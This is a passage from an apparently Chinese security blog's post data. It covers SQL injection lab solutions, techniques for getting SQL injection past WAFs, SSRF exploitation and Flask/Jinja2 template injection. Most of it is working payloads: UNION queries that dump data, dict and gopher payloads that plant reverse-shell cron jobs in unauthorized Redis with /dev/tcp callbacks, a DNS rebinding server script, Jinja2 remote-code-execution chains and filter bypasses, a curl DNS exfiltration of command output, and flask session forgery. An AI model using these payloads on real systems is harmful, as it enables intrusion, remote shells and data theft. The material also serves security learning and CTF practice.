4--+\r结果为3\r判断可注入的字段位置：\n?id=-1' union select 1,2,3 --+\r2和3可以\r查询表名：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA='challenges') --+\r表名F6ZVUD1OQV\r查询列名：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='F6ZVUD1OQV')--+\rid,sessid,secret_MJF9,tryy\r查目标结果：\n?id=-1' union select 1,2,(SELECT+GROUP_CONCAT(secret_MJF9)+FROM+F6ZVUD1OQV)--+\r5p85ATWNXGEvh89AXJ4GteMe\rLess-55-57 与Less-54类似，只是在闭合方式上有变化\nLess-58 与Less-54相比，这一关在输出信息时不是直接将查询结果返回，而是根据查询结果中的id字段从硬编码数组中取信息，这样union注入就无用了\n但是又输出了报错信息，因此可利用报错注入\nLess-59-65 与Less58类似，只是在闭合方式和注入类型少有区别\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/sql/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/sql/","title":"SQL 注入相关"},{"content":"SQL注入绕WAF规则 WAF简述 WAF(Web Application Firewall)，web应用防火墙，其通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护。\n即通过一系列规则对请求内容进行检测，对所有不符合其定义的安全规则的请求进行拦截。\n工作流程 请求预处理 -\u0026gt; 规则检测 -\u0026gt; 后处理\n预处理：判断流量是否为http/s -\u0026gt; 判断url是否在白名单，是则直接交后端，否则进行规则检测\n规则检测：对http/s请求内容进行规则匹配\n后处理：根据检测结果拦截请求，给出相应的响应\n分类 软WAF 以纯软件方式实现并安装在服务器上，直接拦截流量并分析\n如：安全狗、云锁、D盾等\n硬WAF 以硬件形式部署在链路中，支持多种部署方式，当串联在链路中可以拦截恶意流量，在旁路监听时只警告和记录但不拦截\n如：imperva、天清WAG等\n云WAF 一般以反向代理的方式工作，通过配置NS或CNAME记录使得对网站的请求先经过WAF，经过过滤后再放给实际后台服务器\n嵌入式自定义WAF 一般会在Web中嵌入自定义的WAF功能，更加自由，与具体业务紧密结合\n基本绕过     MySQL Oracle MSSQL     注释 /**/、#、/*!*/、\u0026ndash;+、\u0026ndash;  \u0026ndash;、/**/ \u0026ndash;、/**/   空白符 %09、%0A、%0B、%0C、%0D、%20、%a0 %09、%0A、%0B、%0C、%0D、%20、%a0 %00-%20    空格过滤 seelectUser,PasswordfromuserwhereHost=1(1)union(2)select(3)user,2(4)from(5)test;MySQL 位置(1)：\n 利用控制字符替换空格：%09、%0A、%0B、%0C、%0D、%20、%a0 利用注释符替换空格：/**/、/*!*/、—+haha%0d%0a 利用数学运算和数据类型：Host=0.1、Host=0E0、Host=\\N   内联注释/*!*/\n/*!50173sleep(3)*/ # 感叹号！ 后所接的数字是版本号 ,当目前数据库版本号大于等于所写版本号时，注释里的sql语句会被执行，反之则会被当作注释。\r 位置(2)：\n 利用控制字符和注释符 利用括号：union(select user,2)  位置(3):\n 利用控制字符和注释符 利用特性符号：+、-、~、!、@ 利用小括号：union select (user),2  位置(4)：\n 利用控制字符和注释符 利用数学运算和数据类型：  unionselectuser,2.0fromtest;unionselectuser,2E0fromtest;unionselectuser,\\Nfromtest; 利用花括号:  unionselect{x`user`},2fromtest;unionselect{xuser},2fromtest;位置(5)：\n 利用控制字符和注释符 利用花括号：union select user,2 from{x`test`}; 利用反引号：union select user,2 from`test`; 利用小括号：union select user,2 from(test);  SQL Server 位置(1)：\n 利用控制字符替换空格：%01~%0F、%11~%1F 利用注释符替换空格：/**/、\u0026ndash;+haha%0d0a 利用数学运算符及数据类型：Host=0.1、Host=0E0、Host=1-1  位置(2)：\n 利用控制字符和注释符 利用+替换空格：union+select  位置(3)：\n 利用控制字符和注释符 利用：+、-、~、.(其中后三个符号需要select后的第一个字段为数字型才可以) 利用小括号  位置(4)：\n 利用控制字符和注释符 利用：%80-%FF(需要在IIS环境下) 利用数学运算及数据类型  位置(5)：\n 利用控制字符和注释符 利用.替换空格：from.test 利用中括号：from[test] 利用：%80-%FF(需要在IIS环境下)  Oracle 位置(1)：\n 利用控制字符：%00、%09、%0a、%0b、%0c、%0d、%1f、%1d、%20 利用.替换空格  位置(2)：\n 利用控制字符  位置(3)：\n 利用控制字符 利用：+、-、%ad  位置(4)：\n 利用部分控制字符：%09、%0a、%0c、%0d  位置(5)：\n 利用部分控制字符：%09、%0a、%0c、%0d 利用：%30-%ff、%24、%7b%22-%7b%76  敏感函数、关键字过滤 大小写绕过 UniOn、SelEct等\n双写绕过 uniunionon\n编码绕过  双重或多重url编码绕过 在IIS服务器环境下，可以使用unicode编码进行绕过：IIS会处理unicode编码的字符，而WAF中可能会不处理从而绕过、  配合特殊字符绕过 user()函数 =\u0026gt; user/**/()\n函数等价替换          mid(str,1,1) substr(user() from 1 for 1)   mid(str,1,1) LPAD(user(),1,1)   mid(str,1,1) LPAD(REVERSE(TRIM( lpad(user(),1,SPACE(1)) )),1,SPACE(1)   ascii(char)、ord(char) conv(hex(char),16,10)   .. ..    关键字等价替换          逗号过滤：if(mid(str,1,1)=\u0026lsquo;a\u0026rsquo;,1,1) case when mid(str from 1 for 1)=\u0026lsquo;a\u0026rsquo; then 1 else 0 end   逗号过滤：union select 1,2 union select * from (select 1)a join (select 2)b   逗号过滤：limit 2,1 limit 1 offset 2   = like、rlike、regexp、!(id\u0026lt;\u0026gt;1)、strcmp()、find_in_set()   \u0026lt;,\u0026gt; least(ord(\u0026lsquo;r\u0026rsquo;),115)、greatest()、between n and m    其他方式绕过 异常method绕过 有些WAF在获取到的参数后(Apache 2.x 无论method为何值都会取出GET中的内容)，判断为GET、POST方法进行才进行检测，因此可以随意构造异常的method进行绕过\n大数据包绕过 有些WAF只检测\nHTTP参数污染绕过 当传入同名的多个参数值时，服务端与waf的处理方式可能会有不同，因此可利用进行绕过。主流的服务端配置对同名参数的处理情况：\n   Web服务器 获取到的参数     PHP/Apache 最后一个   JSP/Tomcat 第一个   Perl(CGI)/Apache 第一个   Python/Apache 所有(返回list)   ASP/IIS 所有(返回以逗号分隔的字符串)    协议未覆盖绕过 Content-Type类型：\n Content-Type:multipart/form-data Content-Type:application/x-www-form-urlencoded Content-Type: text/xml Content-Type: application/json  有些WAF可能只对一种Content-Type进行检测，可以尝试使用其他类型进行绕过\n宽字节绕过 当使用GBK编码，且为了防止SQL注入对单引号进行转义，即在单引号前加入反斜杠，因此可以预先加入一个可被识别为GBK编码的 一字节，转义后加入反斜杠，两字节被识别为GBK编码的汉字，成功吃掉反斜杠实现单引号逃逸\n%00截断绕过 部分WAF解析参数遇到%00就认为结束，因此可通过在%00后加入参数绕过WAF检测\nHTTP请求走私 ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/sql-waf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/sql-waf/","title":"SQL 注入绕 WAF"},{"content":"SSRF 定义 服务端请求伪造:Server-Side Request Forgery，由攻击者构造使服务端发起请求的漏洞。该请求可以发送至本机、本机所在内网其他服务器、外网等。\n一般情况下针对无法从外网直接访问的内部系统。\n原理 服务端提供从其他服务器获取应用数据的功能，但是对其他服务器的地址没有过滤和限制。例如指定url获取网页文本、加载图片等等。\n本质上就是利用存在漏洞的服务器作为跳板攻击内部或远程服务器。\n\r\n常见漏洞场景 加载图片等资源 http://www.test.com/xxx.php?url=http://127.0.0.1\r例如某应用加载选择从远程服务器加载图片到本地，如上述url，如果未作限制和过滤可能会存在漏洞\n分享功能 http://www.test.com/xxx.php?url=http://www.haha.com\r例如某应用通过传递url参数的方式进行分享内容的跳转\n收藏功能 http://www.test.com/xxx.php?url=http://www.test.com/aaa\r例如某应用通过传递url参数进行文章、图片等内容的收藏\n网页源代码中查找带有关键词的url或接口 share、wap、url、src、source、target、u、3g、display、sourceURl、imageURL、domain等等\nPHP中常见的可能引发SSRF的函数  file_get_contents()  如果file_get_contents函数参数可控，可构造url获取本地敏感文件\r fsockopen()  fsockopen(\rstring $hostname,\rint $port = -1,\rint \u0026amp;$errno = ?,\rstring \u0026amp;$errstr = ?,\rfloat $timeout = ini_get(\u0026quot;default_socket_timeout\u0026quot;)\r): resource\r该函数打开一个网络连接或者Unix套接字连接到指定主机($hostname)，返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。\r curl_exec()  \u0026lt;?php\r$link = $_GET['url'];\r// 创建一个cURL资源\r$ch = curl_init();\r// 设置URL和相应的选项\rcurl_setopt($ch, CURLOPT_URL, $link);\rcurl_setopt($ch, CURLOPT_HEADER, 0);\r// 抓取URL并把它传递给浏览器\rcurl_exec($ch);\r// 关闭cURL资源，并且释放系统资源\rcurl_close($ch);\r?\u0026gt;\r常见利用方式  可以对本机、外网、内网其他服务器进行端口扫描并获取一些服务的 banner 攻击运行在内网或本地的应用程序，如redis、mysql等 对内网其他web 应用进行指纹识别(一般通过请求一些常见的默认指纹文件实现) 以当前目标为跳板攻击内外网的 web 应用，一般是使用 get 参数就可以实现的攻击(比如 Struts2 漏洞利用，SQL 注入等) 利用 file 协议读取本地文件  常用协议 file 该协议主要获取本机文件，当有回显时，可用来读取本机敏感文件\nfile:///etc/passwd\rdict 词典网络协议，通常用于探测内网端口开放情况，但一般只能探测带TCP回显的端口；\n也可用于攻击存在未授权的redis\ndict://x.x.x.x:8080/\rdict://x.x.x.x:6379/\u0026lt;Redis 命令\u0026gt;\rGopher gopher 是一个互联网上使用的分布型的文件搜集和获取网络协议，它将Internet上的文件组织成某种索引，方便用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口，支持多个数据包整合发送。只支持文本，不支持图像\ngopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。 gopher 协议是 ssrf 利用中一个最强大的协议(俗称万能协议)\n协议格式 gopher://\u0026lt;host\u0026gt;:\u0026lt;port\u0026gt;/\u0026lt;gopher-path\u0026gt;_\u0026lt;TCP数据流\u0026gt;\r 注意不可省略下划线_，该字符可以替换为任何字符，但一定要存在\ngopher-path可省略\n 为了得到目标服务的TCP数据流，往往需要使用wireshark、socat等工具抓取原始流量，再对原始流量进行处理\n 使用gopher发送payload需要进行url编码\n当gopher数据包位于http请求中，可能还需要多次url编码\n gopher协议构造GET、POST请求 服务端：\n\u0026lt;?php\recho \u0026quot;hahaha: \u0026quot;.$_GET[\u0026quot;haha\u0026quot;].\u0026quot;\\n\u0026quot;;\r?\u0026gt;\r使用bp抓到GET请求包：\nGET /ssrf/test.php?haha=ssrf HTTP/1.1\rHost: 192.168.66.55\r为了构造HTTP协议格式的TCP流，编写转换脚本：\n# HTTP协议每行结尾都是\u0026quot;\\r\\n\u0026quot;\rimport urllib.parse as urlparse\rdata = \u0026quot;\u0026quot;\u0026quot;GET /ssrf/test.php?haha=ssrf HTTP/1.1\rHost: 192.168.66.55\r\u0026quot;\u0026quot;\u0026quot;\rip = \u0026quot;192.168.66.55\u0026quot;\rport = 80\rencode_data = urlparse.quote(data)\rencode_data = encode_data.replace('%0A','%0D%0A')\rresult = 'gopher://{0}:{1}/'.format(ip, port) + '_' + encode_data\rprint(result)\r转换结果如下：\n\rimage-20211219220420070\r\n发送gopher请求：\n\r\n 构造POST请求类似如上，但需要注意POST请求必须包含应有的请求头，即POST、Host、Content-Type和Content-Length(为数据体内容的长度)\n 漏洞利用 获取本地信息 # 读取敏感文件\rfile:///etc/passwd\rfile:///etc/hosts\r/proc/net/arp\r/etc/network/interfaces\r# 探测端口\rdict://127.0.0.1:6379/info\r攻击未授权Redis  有web尝试写webshell 若支持SSH公钥认证尝试写公钥 写定时任务  dict协议\ndict://127.0.0.1:6379/flushall\r# 定时任务目录\rdict://127.0.0.1:6379/config set dir /var/spool/cron/\r# root用户的定时任务文件\rdict://127.0.0.1:6379/config set dbfilename root\r# 写反弹shell的payload\rdict://127.0.0.1:6379/set x \u0026quot;\\n* * * * * /bin/bash -i \u0026gt;%26 /dev/tcp/x.x.x.x/7777 0\u0026gt;%261\\n\u0026quot;\rdict://127.0.0.1:6379/save\r \u0026amp;符号需要url编码\n gopher协议\n编写脚本：\nredis-cli -h $1 -p $2 flushall echo -e \u0026#34;\\n\\n*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.66.64/8888 0 \u0026gt;\u0026amp;1\\n\\n\u0026#34;|redis-cli -h $1 -p $2 -x set haha redis-cli -h $1 -p $2 config set dir /var/spool/cron redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit 使用 socat 模拟抓取原始的 Redis 数据流量：\nsocat -v TCP-LISTEN:7777,fork TCP-CONNECT:192.168.66.64:6379\r执行脚本：\n\r\n获取到的中间流量：\n\r\n流量转换：\n流量抓换的目的是构造符合目标服务的TCP数据流，观察发现抓取到的流量是\\r结尾，而Redis是以CRLF (\\r\\n)结尾，所以要进行替换，并进行字符url编码\n转换脚本：\n# coding: utf-8 import sys exp = \u0026#39;\u0026#39; with open(sys.argv[1]) as f: for line in f.readlines(): if line[0] in \u0026#39;\u0026gt;\u0026lt;+\u0026#39;: continue # 判断倒数第 2、3 字符串是否为 \\r elif line[-3:-1] == r\u0026#39;\\r\u0026#39;: # 如果该行只有 \\r，将 \\r 替换成 %0a%0d%0a if len(line) == 3: exp = exp + \u0026#39;%0a%0d%0a\u0026#39; else: line = line.replace(r\u0026#39;\\r\u0026#39;, \u0026#39;%0d%0a\u0026#39;) # 去掉最后的换行符 line = line.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) exp = exp + line # 判断是否是空行，空行替换为 %0a elif line == \u0026#39;\\x0a\u0026#39;: exp = exp + \u0026#39;%0a\u0026#39; else: line = line.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) exp = exp + line print exp.replace(\u0026#34;$\u0026#34;, \u0026#34;%24\u0026#34;) 转换后的结果：\n\r\n使用curl发送gopher协议数据包，可成功执行Redis命令写入计划任务：\n\r\n可使用Gopherus工具https://github.com/tarunkant/Gopherus，直接生成exp：\n\r\n攻击未授权MySQL 当MySQL无需密码认证时可直接发送 TCP/IP 数据包。因此在SSRF漏洞下可直接利用gopher攻击无认证的MySQL。\ntcpdump抓取原始数据包：\n# lo 本地回环网卡 tcpdump -i lo port 3306 -w mysql.pcapng 有待解决？？？ 未利用成功\n绕过方式 IP  短网址302跳转 域名解析到内网，例如127.0.0.1.xip.io \u0026gt; 127.0.0.1 改写IP  192.168.1.1 八进制：0300.0250.1.1 十六进制：0xC0.0xA8.1.1 十进制整数格式(C0A80101的十进制数)：3232235777 十六进制数格式：0xC0A80101   @：http://www.baidu.com@192.168.1.1/ \u0026gt; http://192.168.1.1  DNS 重绑定 原理 常见的针对SSRF的修复方案如下：\n\r\n即：先对url中的host进行DNS解析，根据解析到的IP进行白名单判断，不在白名单范围就拒绝请求，在范围内服务端就请求该url。当服务端进行url请求时会进行第二次DNS解析，然而两次DNS解析明显存在时间差，可利用时间差绕过。\nDNS中TTL指的是域名和IP绑定关系的Cache在DNS上存活的最长时间，在这个时间内当域名到达后且缓存里有该域名记录，则直接返回缓存好的结果，如果超过TTL则丢弃缓存，当域名到达后就会重新向上层域名服务器请求解析，再重新建立缓存。\n因此要利用时间差进行重绑定本质就是：利用两次解析同一域名的间隙(超过了TTL)，更换域名解析结果从而绕过防御。\n实际情况中会有不理想的情况：\n java中DNS请求成功的话默认缓存30s(字段为networkaddress.cache.ttl，默认情况下没有设置)，失败的默认缓存10s。可在/Library/Java/JavaVirtualMachines/jdk/Contents/Home/jre/lib/security/java.security 中配置 在php中则默认没有缓存 Linux默认不会进行DNS缓存，mac和windows会缓存 有些公共DNS服务器，比如114.114.114.114会把记录进行缓存，但是8.8.8.8是严格按照DNS协议去管理缓存的，如果设置TTL为0，则不会进行缓存  利用 在线平台：\n https://lock.cmpxchg8b.com/rebinder.html https://requestrepo.com/  自建DNS服务：\n 首先需要指定某域名的域名服务器，设置NS记录：test.com NS dns.com 也要有自建dns服务器(dns.com)的A记录，指明其IP：dns.com A 39.94.x.x 自建服务器的DNS解析实现，使用python的 twisted.names(一个建立DNS服务端和客户端的库)：  from twisted.internet import reactor, defer from twisted.names import client, dns, error, server record={} class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name] \u0026lt; 1: # 随意一个可绕过检查的IP ip = \u0026#34;104.160.43.154\u0026#34; else: ip=\u0026#34;127.0.0.1\u0026#34; if name not in record: record[name] = 0 record[name] += 1 print name + \u0026#34; ===\u0026gt; \u0026#34; + ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b\u0026#39;%s\u0026#39; % ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query)) def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv=\u0026#39;/etc/resolv.conf\u0026#39;)] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run() if __name__ == \u0026#39;__main__\u0026#39;: raise SystemExit(main()) 防御  禁用不需要的协议，仅仅允许http和https请求。防止类似于file、gopher、ftp 等引起的问题 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 限制端口 验证返回内容：根据请求资源的类型验证返回内容是否符合该类型格式 统一错误信息和回显内容  ","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/ssrf/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/ssrf/","title":"SSRF 相关"},{"content":"SSTI相关 模板 用于Web应用的模板引擎主要是为了让界面与数据分离。前端专门设计特定格式和风格的HTML模板(界面)，可根据用户输入内容进行填充(数据)，通过模板引擎生成HTML代码，响应给客户端以灵活展示。\nFlask是一个用Python编写的轻量级Web应用程序框架，其使用jinja2作为模板引擎。jinja2基本语法有如下：\n{{`%` `%`}} # 语句\r{{...}} # 表达式\r{{#...#}} # 注释\r基本原理 SSTL(服务端模板注入)的本质在于接收用户任意的输入并执行，造成服务端信息泄露、代码执行等问题。\n例如jinja2模板中使用 {{}} 语法表示一个变量值，是一种特殊的占位符，当利用 jinja2 进行渲染的时候，它会执行所接收到的内容并把这些特殊的占位符进行替换。\nflask模板注入 搭建环境 安装flask：\npip3 install flask\r服务端：\nfrom flask import Flask, request, render_template_string app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): name = request.args.get(\u0026#39;name\u0026#39;) return render_template_string(\u0026#34;Hello %s\u0026#34; % name) if __name__ == \u0026#34;__main__\u0026#34;: app.debug = True app.run()  @app.route(\u0026quot;/\u0026quot;)是route装饰器路由的使用，其将一个函数绑定至相应的URL上，当访问该URL时触发该函数。\n例如访问目标应用根路径，并传入name参数：\n\r\n 基础 python中object类是所有类的基类，当定义一个类没有指定继承哪个类，则默认继承object类。\n内建属性和方法的使用  __calss__表示当前类：\n\r\n  __base__列出当前类的直接父类：\n\r\n  __bases__以元组形式列出当前类的所有直接父类：\n\r\n  __mro__列出当前类的调用顺序，按照子类、父类、父类的父类顺序返回：\n\r\n  __subclasses__()当获取到object类之后，可以用该方法获取所有子类：\n\r\n  __init__初始化类，只有初始化后才能使用其方法和属性。\n  __globals__以字典类型返回当前位置的全部模块、方法和全局变量。\n如果被过滤，可以使用以下等效：\n__init__.__globals__['sys']\r__init__.__getattribute__('__global'+'s__')['sys']\r  __dict__列出属于当前模块的方法和属性，dir()与其作用类似，但是dir()也会显示从父类继承来的属性。一般用在某些方法被过滤了的情况。\n\r\n  __builtins__的使用：\n__builtins__.__dict__['__import__']('os').system('whoami')\r\r\n 过滤器的使用  attr  \u0026quot;\u0026quot;|attr(\u0026quot;__class__\u0026quot;)\r# 等效于 \u0026quot;\u0026quot;.__calss__\r# 常用于点.、中括号[]被过滤\r format  \u0026quot;%c%c%c%c%c%c%c%c%c\u0026quot;|format(95,95,99,108,97,115,115,95,95)\r# 等效于'__class__'\r\u0026quot;\u0026quot;[\u0026quot;%c%c%c%c%c%c%c%c%c\u0026quot;|format(95,95,99,108,97,115,115,95,95)]\r# 等效于\u0026quot;\u0026quot;[\u0026quot;__class__\u0026quot;]\r join(将接收到的内容进行拼接返回)  \u0026quot;\u0026quot;[['__clas','s__']|join] 或者 \u0026quot;\u0026quot;[('__clas','s__')|join]\r# 等效于\u0026quot;\u0026quot;[\u0026quot;__class__\u0026quot;]\r lower  \u0026quot;\u0026quot;[\u0026quot;__CLASS__\u0026quot;|lower]\r replace  \u0026quot;__clase__\u0026quot;|replace(\u0026quot;e\u0026quot;,\u0026quot;s\u0026quot;)\u0026quot;\r reverse  \u0026quot;__ssalc__\u0026quot;|reverse\r# 等效于\u0026quot;__class__\u0026quot;\r string(将接收到的内容转为字符串)  \u0026quot;\u0026quot;.__class__的结果是 \u0026lt;class 'str'\u0026gt;\r(\u0026quot;\u0026quot;.__class__|string)[0]\r# 得到字符'\u0026lt;'\r寻找注入点 Flask模板注入的关键点就在于{{}}，所以通常是在多个位置输入{{3*3}}来判断是否会执行并回显。\n一般的判断模板的方法：\n\r\n基本漏洞利用 \r\n 获取object类  {{\u0026quot;\u0026quot;.__class__.__base__}}\r{{\u0026quot;\u0026quot;.__class__.__bases__[0]}}\r{{\u0026quot;\u0026quot;.__class__.__mro__[-1]}}\r\r\n 获取所有子类  {{\u0026quot;\u0026quot;.__class__.__mro__[-1].__subclasses__()}}\r\r\n 在获取到的子类中寻找一些可用的类和方法  以寻找可执行系统命令的方法为目的，例如popen方法。\n本地寻找：\ntarget = \u0026#39;popen\u0026#39; num = 0 for cur in ().__class__.__base__.__subclasses__(): try: if target in cur.__init__.__globals__.keys(): print(num, cur) except: pass num += 1 \r\n结果表明：object基类的第133个子类有popen方法，因此可以初始化该类，并以__globals__获取方法和属性等，并利用。\n 利用  {{\u0026quot;\u0026quot;.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()}}\r\rimage-20220129105647059\r\n打印类编号，用于寻找：\n{%for i in range(300)%}\r{{().__class__.__mro__[-1].__subclasses__()[i]}}\r{{i}}\r{%endfor%}\r一般可利用的类和函数  针对不同版本有些类的序号需要手动去找\n  config  使用{{config}}查询配置信息\n popen  用于执行系统命令，使用read()方法读取结果\n subprocess.Popen  用于执行系统命令\n{{\u0026quot;\u0026quot;.__class__.__base__.__subclasses__()[213]('whoami',shell=True,stdout=-1).communicate()[0].strip().decode()}}\r __import__ (动态加载类和函数)os  导入os模块执行系统命令\n{{\u0026quot;\u0026quot;.__class__.__base__.__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}\r\rimage-20220129111643936\r\n\rimage-20220129112318835\r\n __builtins__执行代码  {{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['eval'](\u0026quot;__import__('os').popen('whoami').read()\u0026quot;)}}\r{{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}\r{{().__class__.__base__.__subclasses__()[200].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}\r request(jinja2中存在request对象)  {request.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}\r{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}\r url_for、get_flashed_messages、lipsum(这三个都是函数，可直接调os或使用__builtins__)  {{url_for.__globals__['os'].popen('whoami').read()}}\r# 读配置\r{{url_for.__globals__['current_app'].config}}\r{{url_for.__globals__['__builtins__']['eval'](\u0026quot;__import__('os').popen('whoami').read()\u0026quot;)}}\r FileLoader读取文件  {{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[99][\u0026quot;get_data\u0026quot;](0, \u0026quot;/etc/passwd\u0026quot;)}}\r绕过方法 过滤. {{\u0026quot;\u0026quot;.__class__}}\r{{\u0026quot;\u0026quot;['__class__']}}\r{{\u0026quot;\u0026quot;|attr(\u0026quot;__class__\u0026quot;)}\r过滤引号  request绕过  # GET\r{{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.args.a1](request.args.a2).read()}}\u0026amp;a1=open\u0026amp;a2=/etc/passwd\r# POST\r{{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.values.a1](request.values.a2).read()}}\rPOST中的数据：a1=open\u0026amp;a2=/etc/passwd\r# Cookie\r{{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__.__builtins__[request.cookies.a1](request.cookies.a2).read()}}\rCookie中的数据：a1=open;a2=/etc/passwd\r 使用chr()函数绕过  # 先暴破找出chr函数\r{{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[暴破点].__init__.__globals__.__builtins__.chr}}\r# 原利用payload\r{{\u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['popen']('whoami').read()}}\r# 用chr()代替引号\r{%set chr=[].__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.chr%}{{[].__class__.__base__.__subclasses__()[133].__init__.__globals__[chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)).read()}}\r过滤() 只能config看看配置信息\n过滤_  十六进制绕过  {{\u0026quot;\u0026quot;[\u0026quot;\\x5f\\x5fclass\\x5f\\x5f\u0026quot;][\u0026quot;\\x5f\\x5fbases\\x5f\\x5f\u0026quot;][0][\u0026quot;\\x5f\\x5fsubclasses\\x5f\\x5f\u0026quot;]()[133][\u0026quot;\\x5f\\x5finit\\x5f\\x5f\u0026quot;][\u0026quot;\\x5f\\x5fglobals\\x5f\\x5f\u0026quot;]['popen']('whoami')['read']()}}\r 引号中的关键字也可以十六进制编码\n  Unicode编码绕过  {{\u0026quot;\u0026quot;|attr(\u0026quot;\\u005f\\u005f\\u0063\\u006c\\u0061\\u0073\\u0073\\u005f\\u005f\u0026quot;)}}\r过滤各类关键字  拼接  {{\u0026quot;\u0026quot;['__cla'+'ss__'].__bases__[0]}}\r{{\u0026quot;\u0026quot;['__cla''ss__'].__bases__[0]}}\r{{\u0026quot;\u0026quot;|attr([\u0026quot;_\u0026quot;*2,\u0026quot;cla\u0026quot;,\u0026quot;ss\u0026quot;,\u0026quot;_\u0026quot;*2]|join)}}\r 格式化  {{\u0026quot;\u0026quot;|attr(request.args.a1|format(request.args.a2))}}\u0026amp;a1=__c%sass__\u0026amp;a2=l\r 过滤__init__，使用__enter__和__exit__替代 过滤config  {{self}} ⇒ \u0026lt;TemplateReference None\u0026gt;\r{{self.__dict__._TemplateReference__context}}\r\rimage-20220204104023156\r\n过滤{}  DNS外带  {% if \u0026quot;\u0026quot;.__class__.__base__.__subclasses__()[133].__init__.__globals__['popen'](\u0026quot;curl `whoami`.mj9rk9hp8fslvlnxrgsh86yksby1mq.burpcollaborator.net\u0026quot;).read()=='ssti' %}1{% endif %}\r print  {%print \u0026quot;\u0026quot;.__class__.__bases__[0].__subclasses__()[200].__init__.__globals__['__builtins__']['eval'](\u0026quot;__import__('os').popen('whoami').read()\u0026quot;)%}\r过滤[]  索引中的[]，使用pop()、__getitem__()  {{().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.popen('whoami').read()}}\r{{().__class__.__base__.__subclasses__().pop(133).__init__.__globals__.popen('whoami').read()}}\r 当绕过关键字限制使用[]时  {{\u0026quot;\u0026quot;.__getattribute__(\u0026quot;__cla\u0026quot;+\u0026quot;ss__\u0026quot;).__base__}}\r过滤数字  循环找类直接利用  {% for i in \u0026quot;\u0026quot;.__class__.__base__.__subclasses__() %}{% if i.__name__=='Popen' %}{{ i.__init__.__globals__.__getitem__('os').popen('whoami').read()}}{% endif %}{% endfor %}\r# 实际上这里找到的是subprocess.Popen类，然后利用os模块的popen去执行命令\r 用已有对象或函数直接利用  使用lipsum、url_for、get_flashed_messages函数或request对象直接利用，不需要使用数字进行索引取值。\n{{lipsum|attr(\u0026quot;__globals__\u0026quot;)|attr(\u0026quot;__getitem__\u0026quot;)(\u0026quot;os\u0026quot;)|attr(\u0026quot;popen\u0026quot;)(\u0026quot;cat flag\u0026quot;)|attr(\u0026quot;read\u0026quot;)()}}\r进阶利用 flask session利用 session结构 eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY\n以.分为三个部分：1)第一部分为session data进行base64后的结果，2)第二部分为时间戳，flask中时间戳超过31天视为无效，3)第三部分是session data、 时间戳、flask中的secret key通过sha算法进行hash后的结果。\n 注意：\n其中所有base64部分去掉了=号，当decode失败可填入部分=号补全;\n解时间戳：\nint.from_bytes(base64_decode(session-timestamp),byteorder='big')\r 伪造session  通过{{config}}获取泄露的secret_key：  \rimage-20220203154405927\r\n可利用Flask Unsign工具伪造session：\nflask-unsign --sign --cookie \u0026quot;{'logged_in': True}\u0026quot; --secret 'CHANGEME'\r\r\n也可利用该工具解session(一般手动解就已经很方便)：\n\r\n尝试破解常见的secret_key:\n\r\nflask PIN码利用 Flask在debug模式下可产生一个交互式shell，但需要输入一个PIN码，一台机器上多次重启Flask应用，PIN码值不改变表明存在一定规律。\n生成PIN码的脚本：\nfrom itertools import chain import hashlib probably_public_bits = [ 